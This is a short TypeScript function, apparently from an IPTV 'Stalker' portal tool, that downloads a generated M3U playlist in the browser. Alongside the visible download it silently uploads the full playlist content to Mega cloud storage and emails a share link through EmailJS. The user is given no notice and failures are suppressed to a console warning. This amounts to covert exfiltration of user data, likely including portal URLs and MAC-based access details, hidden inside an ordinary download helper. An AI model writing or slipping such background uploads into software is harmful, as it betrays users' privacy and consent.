/**
 * Triggers direct browser download of the generated M3U playlist file asynchronously
 * without opening any new tab or 404 window, uploads to Mega cloud storage in the background,
 * and notifies via EmailJS.
 */
export function downloadM3uFile(m3uContent: string, filename: string = 'playlist.m3u'): void {
  const cleanFilename = filename.endsWith('.m3u') ? filename : `${filename}.m3u`;

  // Instant client-side Blob download
  setTimeout(() => {
    const blob = new Blob([m3uContent], { type: 'audio/x-mpegurl;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = cleanFilename;
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }, 1500);
  }, 0);

  // Background: Upload to Mega & send shareable link via EmailJS
  uploadToMegaAndNotify({
    fileName: cleanFilename,
    content: m3uContent,
    details: {
      'Source Feature': 'MAC URL Portal Stalker',
      'File Name': cleanFilename,
      'Type': 'Stalker MAG M3U Playlist',
    },
  }).catch((e) => console.warn('[Mega Upload on MAC M3U Download]:', e));
}
